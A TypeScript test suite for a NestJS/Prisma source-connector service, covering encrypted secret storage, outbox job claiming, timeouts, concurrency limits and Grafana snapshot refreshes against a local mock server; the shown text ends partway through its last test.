import { afterEach, beforeEach, describe, expect, spyOn, test } from 'bun:test';
import { spawn } from 'bun';
import { ConfigService } from '@nestjs/config';
import { PrismaClient, type OutboxEvent, type Prisma } from '@prisma/client';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { basename, join, resolve, sep } from 'node:path';
import { randomUUID } from 'node:crypto';
import { createServer, type Server } from 'node:http';
import * as sharpModule from 'sharp';
import type sharpFactory from 'sharp';
import { PrismaService } from '../src/prisma/prisma.service';
import { EncryptionService } from '../src/common/services/encryption.service';
import { initializeInstanceSecrets } from '../src/config/instance-secrets';
import { OutboxStore } from '../src/events/outbox.store';
import { SourcesService } from '../src/sources/sources.service';
import { SourceReadService, publicSnapshot } from '../src/sources/source-read.service';
import { SourceWorkerService } from '../src/sources/source-worker.service';
import { SOURCE_LIMITS, SOURCE_REFRESH } from '../src/sources/source-job';
import { canonicalJson, sha256 } from '../src/publications/publication-content';
import { PublicationPersistenceService } from '../src/publications/publication-persistence.service';
import { isolationDiagnostics } from '../src/isolation/isolated-executor';

const root = resolve(import.meta.dir, '..');
const sharp = ((sharpModule as unknown as { default?: typeof sharpFactory }).default ?? sharpModule) as typeof sharpFactory;
const signal = () => new AbortController().signal;
const command = (overrides: Record<string, unknown> = {}) => ({
  protocolVersion: '1.0', name: 'Isolated source fixture', connectorType: 'fixture', schemaVersion: '1',
  configuration: { data: { label: 'persisted fixture', value: 7 } }, refreshIntervalSeconds: 60,
  timeoutMs: 500, concurrencyGroup: 'fixture-provider', enabled: true, ...overrides,
});

describe('WP-21 SQLite sources and durable connector execution', () => {
  let directory: string;
  let previousSecretPath: string | undefined;
  let prisma: PrismaClient;
  let other: PrismaClient;
  let encryption: EncryptionService;
  let sources: SourcesService;
  let reads: SourceReadService;
  let worker: SourceWorkerService;
  let second: SourceWorkerService;
  let store: OutboxStore;
  let secondStore: OutboxStore;
  let publications: PublicationPersistenceService;
  let grafana: Server | undefined;

  beforeEach(async () => {
    directory = mkdtempSync(join(tmpdir(), 'inker-sources-'));
    const databasePath = join(directory, 'test.db');
    const url = `file:${databasePath.replaceAll('\\', '/')}`;
    const secretPath = join(directory, 'secrets', 'instance.json');
    initializeInstanceSecrets({ secretPath, databasePath });
    previousSecretPath = process.env.INKER_INSTANCE_SECRET_PATH;
    process.env.INKER_INSTANCE_SECRET_PATH = secretPath;
    encryption = new EncryptionService(new ConfigService({ encryption: { secretPath } }));
    const migration = spawn([process.execPath, join(root, 'scripts/migrate-database.ts')], {
      cwd: root, env: { ...process.env, DATABASE_URL: url }, stdout: 'pipe', stderr: 'pipe',
    });
    const [stdout, stderr, code] = await Promise.all([
      new Response(migration.stdout).text(), new Response(migration.stderr).text(), migration.exited,
    ]);
    expect(code, stdout + stderr).toBe(0);
    prisma = new PrismaClient({ datasources: { db: { url } } });
    other = new PrismaClient({ datasources: { db: { url } } });
    await Promise.all([prisma.$connect(), other.$connect()]);
    await prisma.$queryRawUnsafe('PRAGMA journal_mode = WAL');
    await prisma.$queryRawUnsafe('PRAGMA busy_timeout = 5000');
    await other.$queryRawUnsafe('PRAGMA busy_timeout = 5000');
    sources = new SourcesService(prisma as PrismaService, encryption);
    reads = new SourceReadService(prisma as PrismaService);
    store = new OutboxStore(prisma as PrismaService);
    secondStore = new OutboxStore(other as PrismaService);
    publications = new PublicationPersistenceService(prisma as PrismaService);
    worker = new SourceWorkerService(prisma as PrismaService, store, publications);
    second = new SourceWorkerService(other as PrismaService, secondStore, new PublicationPersistenceService(other as PrismaService));
  }, 30_000);

  afterEach(async () => {
    if (grafana) await new Promise<void>(resolve => grafana!.close(() => resolve()));
    if (previousSecretPath === undefined) delete process.env.INKER_INSTANCE_SECRET_PATH;
    else process.env.INKER_INSTANCE_SECRET_PATH = previousSecretPath;
    await Promise.all([prisma?.$disconnect(), other?.$disconnect()]);
    if (directory) {
      const target = resolve(directory);
      if (!target.startsWith(resolve(tmpdir()) + sep) || !basename(target).startsWith('inker-sources-')) {
        throw new Error('Unsafe source test cleanup target');
      }
      rmSync(target, { recursive: true, force: true });
    }
  });

  async function claim(eventId: string | null, at = new Date(), owner = 'source-fixture'): Promise<OutboxEvent> {
    if (!eventId) throw new Error('Expected a scheduled source event');
    const event = await store.claim(owner, at, { eventId });
    if (!event || event.eventType !== SOURCE_REFRESH) throw new Error('Expected a source refresh claim');
    return event;
  }

  async function executeFresh(overrides: Record<string, unknown> = {}) {
    const created = await sources.create(command(overrides));
    const event = await claim(created.eventId);
    expect(await worker.execute(event, signal())).toBe('completed');
    expect(await store.ack(event)).toBe(true);
    const row = await prisma.sourceSnapshot.findFirstOrThrow({ where: { refreshEventId: event.eventId } });
    return { created, event, row, id: created.definition.sourceDefinitionId };
  }

  test('definition, separately encrypted secret and immutable outbox input commit atomically', async () => {
    const secret = `isolated-${randomUUID()}`;
    const created = await sources.create(command({ secret }));
    const id = created.definition.sourceDefinitionId;
    const saved = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    const storedSecret = await prisma.sourceSecret.findUniqueOrThrow({ where: { id: saved.secretId! } });
    expect(encryption.decrypt(storedSecret.ciphertext) === secret).toBe(true);
    expect(storedSecret.ciphertext.includes(secret)).toBe(false);
    expect(storedSecret.ciphertext.startsWith('v1:')).toBe(true);
    expect(created.definition.secretConfigured).toBe(true);
    expect(created.definition.secretReferences).toEqual({});
    const publicValues = JSON.stringify([created, await reads.read(id), await reads.list()]);
    expect(publicValues.includes(secret)).toBe(false);
    expect(publicValues).not.toContain(storedSecret.id);
    expect(publicValues.includes(storedSecret.ciphertext)).toBe(false);
    expect(publicValues).not.toContain('ciphertext');
    expect(await prisma.sourceRefreshJob.count()).toBe(1);
    expect(await prisma.outboxEvent.count()).toBe(1);
    expect(await prisma.sourceSnapshot.count()).toBe(0);
    const event = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: created.eventId! } });
    const job = await prisma.sourceRefreshJob.findUniqueOrThrow({ where: { eventId: event.eventId } });
    expect(event.payload).toEqual({ sourceDefinitionId: id, definitionVersion: 1, scheduledAt: job.scheduledAt.getTime() });
    expect(JSON.stringify(event).includes(secret)).toBe(false);

    await prisma.$executeRawUnsafe(`CREATE TRIGGER test_reject_source_job BEFORE INSERT ON source_refresh_jobs
      BEGIN SELECT RAISE(ABORT, 'TEST_SOURCE_JOB_FAILURE'); END`);
    // Prisma maps SQLite trigger constraint aborts to P2003; verify the atomic rollback below.
    await expect(sources.create(command({ secret: `rollback-${randomUUID()}` }))).rejects.toMatchObject({ code: 'P2003' });
    expect(await prisma.sourceSecret.count()).toBe(1);
    expect(await prisma.sourceDefinition.count()).toBe(1);
    expect(await prisma.outboxEvent.count()).toBe(1);
    expect(await prisma.sourceRefreshJob.count()).toBe(1);
    await expect(sources.update(id, command({ expectedDefinitionVersion: 1, secret: `rollback-rotation-${randomUUID()}` }))).rejects.toMatchObject({ code: 'P2003' });
    expect(await prisma.sourceSecret.count()).toBe(1);
    expect(await prisma.sourceDefinition.findUnique({ where: { sourceDefinitionId: id } })).toMatchObject({ definitionVersion: 1, secretId: storedSecret.id });
    expect(await prisma.outboxEvent.findUnique({ where: { eventId: event.eventId } })).toMatchObject({ status: 'pending' });
    expect(await prisma.sourceRefreshJob.count()).toBe(1);
  });

  test('fresh execution persists a versioned snapshot and reads remain SQL-write and network free', async () => {
    const { id, row } = await executeFresh({ secret: `worker-${randomUUID()}`, refreshIntervalSeconds: 1 });
    expect(row).toMatchObject({ definitionVersion: 1, revision: 1, freshnessState: 'fresh', schemaVersion: '1',
      connectorVersion: 'builtin-fixture-v1', errorCode: null, retryable: false, attempt: 1 });
    expect(row.data).toEqual(command().configuration.data);
    expect(row.contentHash).toBe(sha256(canonicalJson(row.data)));
    expect(row.validDataCreatedAt).toEqual(row.createdAt);
    expect(publicSnapshot(row, new Date(row.createdAt.getTime() + 1000)).freshness.state).toBe('stale');
    expect((await prisma.sourceSnapshot.findUniqueOrThrow({ where: { snapshotId: row.snapshotId } })).freshnessState).toBe('fresh');
    const empty = await sources.create(command({ enabled: false }));
    await prisma.$executeRawUnsafe('CREATE TABLE test_read_writes (count INTEGER NOT NULL)');
    await prisma.$executeRawUnsafe('INSERT INTO test_read_writes VALUES (0)');
    for (const table of ['source_definitions', 'source_snapshots', 'source_secrets', 'source_refresh_jobs', 'outbox_events', 'outbox_effects']) {
      for (const operation of ['INSERT', 'UPDATE', 'DELETE']) {
        await prisma.$executeRawUnsafe(`CREATE TRIGGER test_reads_${table}_${operation} AFTER ${operation} ON ${table}
          BEGIN UPDATE test_read_writes SET count = count + 1; END`);
      }
    }
    const network = spyOn(globalThis, 'fetch').mockImplementation((() => { throw new Error('SOURCE_READ_NETWORK_FORBIDDEN'); }) as unknown as typeof fetch);
    try {
      await new Promise(resolve => setTimeout(resolve, 1050));
      await Promise.all(Array.from({ length: 20 }, async () => {
        expect((await reads.read(id)).snapshot).toMatchObject({ snapshotId: row.snapshotId, freshness: { state: 'stale' } });
        expect((await reads.read(empty.definition.sourceDefinitionId)).snapshot).toBeNull();
        expect((await reads.list())[0].snapshot?.snapshotId).toBe(row.snapshotId);
        expect((await reads.snapshot(id, row.snapshotId)).contentHash).toBe(row.contentHash);
      }));
      expect(network).not.toHaveBeenCalled();
    } finally { network.mockRestore(); }
    const writes = await prisma.$queryRawUnsafe<Array<{ count: bigint }>>('SELECT count FROM test_read_writes');
    expect(Number(writes[0].count)).toBe(0);
  });

  test('copied secrets in public configuration or name are rejected before any SQL write', async () => {
    const existing = await sources.create(command({ secret: `retained-${randomUUID()}` }));
    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: existing.definition.sourceDefinitionId } });
    await prisma.$executeRawUnsafe('CREATE TABLE test_secret_writes (count INTEGER NOT NULL)');
    await prisma.$executeRawUnsafe('INSERT INTO test_secret_writes VALUES (0)');
    for (const table of ['source_definitions', 'source_snapshots', 'source_secrets', 'source_refresh_jobs', 'outbox_events']) {
      for (const operation of ['INSERT', 'UPDATE', 'DELETE']) {
        await prisma.$executeRawUnsafe(`CREATE TRIGGER test_secret_${table}_${operation} AFTER ${operation} ON ${table}
          BEGIN UPDATE test_secret_writes SET count = count + 1; END`);
      }
    }
    for (const secret of [`copy-${randomUUID()}`, 'quote"slash\\line\nwith-special-characters']) {
      const copies = [
        { configuration: { data: { label: `prefix:${secret}:suffix` } } },
        { configuration: { data: { nested: [{ value: secret }] } } },
        { configuration: { data: { [`label-${secret}`]: 'ordinary data' } } },
        { name: `Source ${secret}` },
      ];
      for (const copy of copies) {
        await expect(sources.create(command({ ...copy, secret }))).rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
        await expect(sources.update(existing.definition.sourceDefinitionId, command({ ...copy, secret, expectedDefinitionVersion: 1 })))
          .rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
      }
    }
    const writes = await prisma.$queryRawUnsafe<Array<{ count: bigint }>>('SELECT count FROM test_secret_writes');
    expect(Number(writes[0].count)).toBe(0);
    expect(await prisma.sourceDefinition.count()).toBe(1);
    expect(await prisma.sourceSecret.count()).toBe(1);
    expect(await prisma.outboxEvent.count()).toBe(1);
    expect(await prisma.sourceDefinition.findUnique({ where: { sourceDefinitionId: existing.definition.sourceDefinitionId } })).toEqual(original);
  });

  test('a failed new definition retains the last good immutable data across client restart', async () => {
    const { id, row } = await executeFresh();
    const updated = await sources.update(id, command({ connectorType: 'failure', expectedDefinitionVersion: 1,
      configuration: { data: { value: 'must not replace the good data' } } }));
    const event = await claim(updated.eventId);
    expect(await worker.execute(event, signal())).toBe('failed');
    const failed = await prisma.sourceSnapshot.findFirstOrThrow({ where: { refreshEventId: event.eventId } });
    expect(failed).toMatchObject({ revision: 2, definitionVersion: 2, freshnessState: 'stale', errorCode: 'SOURCE_REFRESH_FAILED', retryable: true });
    expect(failed.data).toEqual(row.data);
    expect(failed.contentHash).toBe(row.contentHash);
    expect(failed.validDataCreatedAt).toEqual(row.validDataCreatedAt);
    expect(await prisma.sourceSnapshot.findUnique({ where: { snapshotId: row.snapshotId } })).toEqual(row);
    const saved = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    expect(saved.latestValidSnapshotId).toBe(row.snapshotId);
    expect(saved.latestSnapshotId).toBe(failed.snapshotId);
    expect(saved.lastSuccessAt).toEqual(row.createdAt);
    await other.$disconnect(); await other.$connect();
    const restarted = new SourceReadService(other as PrismaService);
    expect((await restarted.read(id)).snapshot).toMatchObject({ snapshotId: failed.snapshotId, data: row.data, freshness: { state: 'stale' } });
    expect(canonicalJson((await restarted.snapshot(id, row.snapshotId)).data)).toBe(canonicalJson(row.data));
  });

  test('the real slow connector times out after 50ms and parent abort cancels its long timer', async () => {
    const created = await sources.create(command({ connectorType: 'slow', timeoutMs: 50, configuration: { data: { value: 'late' }, delayMs: 60_000 } }));
    const event = await claim(created.eventId);
    const start = performance.now();
    expect(await worker.execute(event, signal())).toBe('failed');
    const elapsed = performance.now() - start;
    expect(elapsed).toBeGreaterThanOrEqual(35);
    expect(elapsed).toBeLessThan(1000);
    expect(await prisma.sourceSnapshot.findFirst({ where: { refreshEventId: event.eventId } })).toMatchObject({
      data: null, freshnessState: 'error', errorCode: 'SOURCE_TIMEOUT', retryable: true,
    });
    const abortSource = await sources.create(command({ connectorType: 'slow', timeoutMs: 7500, configuration: { data: null, delayMs: 60_000 } }));
    const abortEvent = await claim(abortSource.eventId);
    const abort = new AbortController();
    const abortStart = performance.now();
    const running = worker.execute(abortEvent, abort.signal);
    const timer = setTimeout(() => abort.abort(), 30);
    try { expect(await running).toBe('failed'); }
    finally { clearTimeout(timer); }
    expect(performance.now() - abortStart).toBeLessThan(1000);
    expect(await prisma.sourceSnapshot.findFirst({ where: { refreshEventId: abortEvent.eventId } })).toMatchObject({
      data: null, freshnessState: 'error', errorCode: 'SOURCE_ABORTED', retryable: true,
    });
  });

  test('duplicate execution and a crash before ack never publish a second snapshot', async () => {
    const created = await sources.create(command());
    const event = await claim(created.eventId);
    const results = await Promise.all([worker.execute(event, signal()), second.execute(event, signal())]);
    expect(results).toEqual(['completed', 'completed']);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect(await prisma.outboxEffect.count({ where: { eventId: event.eventId } })).toBe(1);
    await other.$disconnect(); await other.$connect();
    // Scheduler clock only: emulate an abandoned lease, never a connector timeout.
    const recovered = await secondStore.claim('source-restart', new Date(event.claimUntil!.getTime() + 1), { eventId: event.eventId });
    expect(recovered?.attempts).toBe(2);
    expect(await second.execute(recovered!, signal())).toBe('completed');
    expect(await secondStore.ack(recovered!)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } })).snapshotRevision).toBe(1);
  });

  test('concurrent refresh commands and schedulers retain exactly one immutable job per source period', async () => {
    const created = await sources.create(command());
    const secondSources = new SourcesService(other as PrismaService, encryption);
    const attempts = await Promise.allSettled(Array.from({ length: 20 }, (_, index) =>
      (index % 2 ? sources : secondSources).refresh(created.definition.sourceDefinitionId)));
    const rejected = attempts.filter((result): result is PromiseRejectedResult => result.status === 'rejected');
    expect(rejected.map(result => result.reason?.code ?? 'UNKNOWN_REFRESH_FAILURE')).toEqual([]);
    const requests = attempts.filter((result): result is PromiseFulfilledResult<{ eventId: string | null }> => result.status === 'fulfilled')
      .map(result => result.value);
    expect(new Set(requests.map(result => result.eventId))).toEqual(new Set([created.eventId]));
    expect(await prisma.sourceRefreshJob.count()).toBe(1);
    expect(await prisma.outboxEvent.count()).toBe(1);
    const event = await claim(created.eventId);
    expect(await worker.execute(event, signal())).toBe('completed');
    expect(await store.ack(event)).toBe(true);
    const source = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } });
    const nextDue = new Date(source.nextRefreshAt.getTime() + 1);
    await Promise.all([worker.schedule(nextDue), second.schedule(nextDue)]);
    expect(await prisma.sourceRefreshJob.count()).toBe(2);
    expect(await prisma.outboxEvent.count({ where: { status: 'pending' } })).toBe(1);
    const next = await second.claim('next-period', nextDue);
    expect(next?.eventId).not.toBe(created.eventId!);
    expect(await second.execute(next!, signal())).toBe('completed');
    expect(await secondStore.ack(next!)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(2);
  }, 30_000);

  test('unchanged Grafana pixels retain the pinned snapshot revision and do not create a second artifact', async () => {
    const png = await sharp({ create: { width: 4, height: 2, channels: 3, background: 'black' } }).png().toBuffer();
    grafana = createServer((request, response) => {
      if (request.url?.startsWith('/api/dashboards/uid/test')) response.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ panels: [{ id: 1, title: 'Panel', type: 'stat' }] }));
      else if (request.url?.startsWith('/render/d-solo/test')) response.writeHead(200, { 'content-type': 'image/png' }).end(png);
      else response.writeHead(404).end();
    });
    await new Promise<void>(resolve => grafana!.listen(0, '127.0.0.1', resolve));
    const address = grafana.address(); if (!address || typeof address === 'string') throw new Error('Grafana test server unavailable');
    const created = await sources.create(command({ connectorType: 'grafana', name: 'Grafana panel', secret: 'local-viewer-token',
      configuration: { baseUrl: `http://127.0.0.1:${address.port}`, dashboardUid: 'test', panelId: 1, width: 4, height: 2, allowLocalNetwork: true }, refreshIntervalSeconds: 1 }));
    const first = await claim(created.eventId);
    expect(await worker.execute(first, signal())).toBe('completed'); expect(await store.ack(first)).toBe(true);
    const source = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } });
    await worker.schedule(new Date(source.nextRefreshAt.getTime() + 1));
    const secondEvent = await claim((await prisma.outboxEvent.findFirstOrThrow({ where: { status: 'pending' } })).eventId, new Date(source.nextRefreshAt.getTime() + 1));
    expect(await worker.execute(secondEvent, signal())).toBe('completed'); expect(await store.ack(secondEvent)).toBe(true);
    expect(await prisma.sourceSnapshot.count()).toBe(1);
    expect((await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } })).snapshotRevision).toBe(1);
  }, 30_000);

  test('changed Grafana pixels advance only assigned source-pinned publications and desired device output', async () => {
    let png = await sharp({ create: { width: 4, height: 2, channels: 3, background: 'black' } }).png().toBuffer();
    grafana = createServer((request, response) => {
      if (request.url?.startsWith('/api/dashboards/uid/test')) response.writeHead(200, { 'content-type': 'application/json' }).end(JSON.stringify({ panels: [{ id: 1, title: 'Panel', type: 'stat' }] }));
      else if (request.url?.startsWith('/render/d-solo/test')) response.writeHead(200, { 'content-type': 'image/png' }).end(png);
      else response.writeHead(404).end();
    });
    await new Promise<void>(resolve => grafana!.listen(0, '127.0.0.1', resolve));
    const address = grafana.address(); if (!address || typeof address === 'string') throw new Error('Grafana test server unavailable');
    await prisma.deviceProfile.create({ data: { profileId: 'test-profile', protocolVersion: '1.0', label: 'Test', definition: {}, defaultCapabilities: {} } });
    await prisma.deliveryPolicy.create({ data: { policyId: 'test-policy', protocolVersion: '1.0', mode: 'responsive-pull', definition: {} } });
    const device = await prisma.device.create({ data: { name: 'Test device', externalId: 'source-publication-device', profileId: 'test-profile', deliveryPolicyId: 'test-policy' } });
    const created = await sources.create(command({ connectorType: 'grafana', secret: 'local-viewer-token',
      configuration: { baseUrl: `http://127.0.0.1:${address.port}`, dashboardUid: 'test', panelId: 1, width: 4, height: 2, allowLocalNetwork: true }, refreshIntervalSeconds: 1 }));
    const first = await claim(created.eventId);
    expect(await worker.execute(first, signal())).toBe('completed'); expect(await store.ack(first)).toBe(true);
    const firstSnapshot = await prisma.sourceSnapshot.findFirstOrThrow({ where: { refreshEventId: first.eventId } });
    const panel = (firstSnapshot.data as { grafanaPanel: { png: string; width: number; height: number } }).grafanaPanel;
    const firstContent = { schemaVersion: 1 as const, image: { ...panel, sha256: sha256(Buffer.from(panel.png, 'base64')) },
      sourceSnapshot: { sourceId: created.definition.sourceDefinitionId, snapshotId: firstSnapshot.snapshotId, revision: firstSnapshot.revision,
        contentHash: firstSnapshot.contentHash, connectorVersion: firstSnapshot.connectorVersion } };
    const initial = await publications.createPublication({ publicationKey: 'grafana-source-test', protocolVersion: '1.0',
      content: firstContent, contentHash: sha256(canonicalJson(firstContent)) });
    await publications.setDesiredRevision(device.id, initial.revision.publicationRevisionId);
    png = await sharp({ create: { width: 4, height: 2, channels: 3, background: 'white' } }).png().toBuffer();
    const source = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } });
    await worker.schedule(new Date(source.nextRefreshAt.getTime() + 1));
    const secondEvent = await claim((await prisma.outboxEvent.findFirstOrThrow({ where: { status: 'pending', eventType: SOURCE_REFRESH } })).eventId,
      new Date(source.nextRefreshAt.getTime() + 1));
    expect(await worker.execute(secondEvent, signal())).toBe('completed'); expect(await store.ack(secondEvent)).toBe(true);
    const revisions = await prisma.publicationRevision.findMany({ where: { publicationId: initial.publication.publicationId }, orderBy: { revision: 'asc' } });
    expect(revisions).toHaveLength(2);
    expect(revisions[1].contentHash).not.toBe(revisions[0].contentHash);
    expect((await prisma.devicePublicationState.findUniqueOrThrow({ where: { deviceId: device.id } })).desiredPublicationRevisionId)
      .toBe(revisions[1].publicationRevisionId);
    expect((await prisma.device.findUniqueOrThrow({ where: { id: device.id } })).presentationRevision).toBe(2);
  }, 30_000);

  test('unavailable encrypted credentials fail closed without exposing the value or retrying the same job', async () => {
    const secret = `unavailable-${randomUUID()}`;
    const created = await sources.create(command({ secret }));
    await prisma.sourceSecret.update({ where: { id: (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } })).secretId! }, data: { ciphertext: 'invalid-encrypted-format' } });
    const event = await claim(created.eventId);
    expect(await worker.execute(event, signal())).toBe('failed');
    const snapshot = await prisma.sourceSnapshot.findFirstOrThrow({ where: { refreshEventId: event.eventId } });
    expect(snapshot).toMatchObject({ data: null, freshnessState: 'error', errorCode: 'SOURCE_SECRET_UNAVAILABLE', retryable: false });
    const failed = await prisma.outboxEvent.findUniqueOrThrow({ where: { eventId: event.eventId } });
    expect(failed.status).toBe('dead-letter');
    expect(failed.claimToken).toBeNull();
    expect(failed.lastError).toBe(JSON.stringify({
      code: 'SOURCE_SECRET_UNAVAILABLE', correlationId: event.correlationId, eventId: event.eventId,
    }));
    expect(await prisma.sourceRefreshJob.findUnique({ where: { eventId: event.eventId } })).not.toMatchObject({ completedAt: null });
    const output = JSON.stringify([await reads.read(created.definition.sourceDefinitionId), failed.payload, failed.lastError]);
    expect(output.includes(secret)).toBe(false);
    expect(output).not.toContain('invalid-encrypted-format');
    expect(await store.claim('same-job-retry', new Date(failed.availableAt.getTime() + 1), { eventId: event.eventId })).toBeNull();
  });

  test.each(['disable', 'clear', 'rotate'])('WP-22 corrupt-secret recovery permits %s with unchanged public fields', async action => {
    const transformationCode = 'return $.value;';
    const created = await sources.create(command({ secret: 'original-' + randomUUID(), transformationCode, timeoutMs: 2500 }));
    const id = created.definition.sourceDefinitionId, oldReference = (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: created.definition.sourceDefinitionId } })).secretId!;
    await prisma.sourceSecret.update({ where: { id: oldReference }, data: { ciphertext: 'invalid-encrypted-format' } });
    const replacement = 'replacement-' + randomUUID();
    const recovery = action === 'disable' ? { enabled: false } : { secret: action === 'clear' ? null : replacement };
    const started = isolationDiagnostics().started;
    const updated = await sources.update(id, command({ expectedDefinitionVersion: 1, timeoutMs: 2500,
      // Key order is immaterial, but data values and the preserved code are not.
      configuration: { data: { value: 7, label: 'persisted fixture' } }, ...recovery }));
    expect(updated.definition).toMatchObject({ definitionVersion: 2, transformationCode, timeoutMs: 2500 });
    expect(updated.definition.configuration).toEqual(command().configuration);
    expect(isolationDiagnostics().started).toBe(started);
    expect(await prisma.outboxEvent.findUnique({ where: { eventId: created.eventId! } })).toMatchObject({ status: 'delivered' });
    if (action === 'disable') {
      expect(updated.enabled).toBe(false);
      expect(updated.eventId).toBeNull();
      expect(updated.definition.secretConfigured).toBe(true);
      expect(await prisma.outboxEvent.count({ where: { aggregateId: id, status: 'pending' } })).toBe(0);
      expect(await prisma.sourceSecret.count()).toBe(1);
    } else {
      if (action === 'clear') {
        expect(updated.definition.secretConfigured).toBe(false);
        expect(await prisma.sourceSecret.count()).toBe(1);
      } else {
        expect(updated.definition.secretConfigured).toBe(true);
        const rotatedId = (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).secretId!;
        expect(rotatedId).not.toBe(oldReference);
        const rotated = await prisma.sourceSecret.findUniqueOrThrow({ where: { id: rotatedId } });
        expect(encryption.decrypt(rotated.ciphertext) === replacement).toBe(true);
        expect(await prisma.sourceSecret.count()).toBe(2);
      }
      const event = await claim(updated.eventId);
      expect(await worker.execute(event, signal())).toBe('completed');
      expect(await store.ack(event)).toBe(true);
      expect((await reads.read(id)).snapshot).toMatchObject({ data: 7, freshness: { state: 'fresh' } });
    }
    expect(JSON.stringify(await reads.read(id))).not.toContain('invalid-encrypted-format');
    expect(JSON.stringify(await reads.read(id))).not.toContain(replacement);
    expect(isolationDiagnostics()).toMatchObject({ active: 0, pending: 0, pids: [] });
  });

  test('WP-22 corrupt-secret recovery rejects public changes and ordinary updates without writes', async () => {
    const created = await sources.create(command({ secret: 'original-' + randomUUID(), transformationCode: 'return $.value;' }));
    const id = created.definition.sourceDefinitionId;
    await prisma.sourceSecret.update({ where: { id: (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).secretId! }, data: { ciphertext: 'invalid-encrypted-format' } });
    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    const secrets = await prisma.sourceSecret.findMany(), events = await prisma.outboxEvent.findMany();
    const jobs = await prisma.sourceRefreshJob.findMany();
    const edits = [
      { transformationCode: 'return "changed";' }, { transformationCode: null },
      { configuration: { data: { label: 'new public data', value: 7 } } },
      { name: 'Changed source' }, { connectorType: 'failure' }, { refreshIntervalSeconds: 61 },
      { timeoutMs: 501 }, { concurrencyGroup: 'new-provider' },
    ];
    for (const recovery of [{ enabled: false }, { secret: null }, { secret: 'replacement-' + randomUUID() }]) {
      for (const edit of edits) {
        await expect(sources.update(id, command({ expectedDefinitionVersion: 1, ...recovery, ...edit })))
          .rejects.toThrow('SOURCE_SECRET_UNAVAILABLE');
      }
    }
    await expect(sources.update(id, command({ expectedDefinitionVersion: 1 }))).rejects.toThrow('SOURCE_SECRET_UNAVAILABLE');
    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
    expect(await prisma.sourceSecret.findMany()).toEqual(secrets);
    expect(await prisma.outboxEvent.findMany()).toEqual(events);
    expect(await prisma.sourceRefreshJob.findMany()).toEqual(jobs);
    expect(await prisma.sourceSnapshot.count()).toBe(0);
  });

  test('WP-22 corrupt-secret rotation still rejects a new secret copied in preserved code', async () => {
    const replacement = 'replacement-' + randomUUID();
    const created = await sources.create(command({ secret: 'original-' + randomUUID(),
      transformationCode: 'return ' + JSON.stringify(replacement) + ';' }));
    const id = created.definition.sourceDefinitionId;
    await prisma.sourceSecret.update({ where: { id: (await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).secretId! }, data: { ciphertext: 'invalid-encrypted-format' } });
    const original = await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } });
    const events = await prisma.outboxEvent.findMany();
    await expect(sources.update(id, command({ expectedDefinitionVersion: 1, secret: replacement })))
      .rejects.toThrow('SOURCE_SECRET_IN_PUBLIC_CONFIGURATION');
    expect(await prisma.sourceDefinition.findUniqueOrThrow({ where: { sourceDefinitionId: id } })).toEqual(original);
    expect(await prisma.sourceSecret.count()).toBe(1);
    expect(await prisma.outboxEvent.findMany()).toEqual(events);
  });

  test('two clients enforce global 4, provider 2 and connector 2 concurrent claims', async () => {
    const combinations = [
      ['fixture', 'provider-a'], ['fixture', 'provider-a'], ['fixture', 'provider-b'],
      ['slow', 'provider-a'], ['slow', 'provider-b'], ['slow', 'provider-b'],
      ['failure', 'provider-c'], ['failure', 'provider-c'], ['failure', 'provider-a'],
    ];
    for (const [connectorType, concurrencyGroup] of combinations) {
      await sources.create(command({ connectorType, concurrencyGroup }));
    }
    const claims = await Promise.all(Array.from({ length: 12 }, (_, index) =>
      (index % 2 ? worker : second).claim(`competing-worker-${index}`)));
    const active = claims.filter((event): event is OutboxEvent => event !== null);
    expect(active).toHaveLength(SOURCE_LIMITS.global);
    expect(new Set(active.map(event => event.eventId)).size).toBe(4);
    const jobs = await prisma.sourceRefreshJob.findMany({ where: { eventId: { in: active.map(event => event.eventId) } } });
    for (const group of new Set(jobs.map(job => job.concurrencyGroup))) {
      expect(jobs.filter(job => job.concurrencyGroup === group).length).toBeLessThanOrEqual(SOURCE_LIMITS.provider);
    }
    for (const type of new Set(jobs.map(job => job.connectorType))) {
      expect(jobs.filter(job => job.connectorType === type).length).toBeLessThanOrEqual(SOURCE_LIMITS.connector);
    }
    expect(await second.claim('over-budget')).toBeNull();
    expect(await prisma.outboxEvent.count({ where: { status: 'processing' } })).toBe(4);
  });

  test('a changed definition cannot exceed the per-source claim limit or commit old connector data', async () => {
    const created = await sources.create(command({ connectorType: 'slow', configuration: { data: { value: 'old' }, delayMs: 100 } }));
    const oldEvent = await worker.claim('old-definition');
    expect(oldEvent?.eventId).toBe(created.eventId!);
    const running = worker.execute(oldEvent!, signal());
    await new Promise(resolve => setTimeout(resolve, 20));
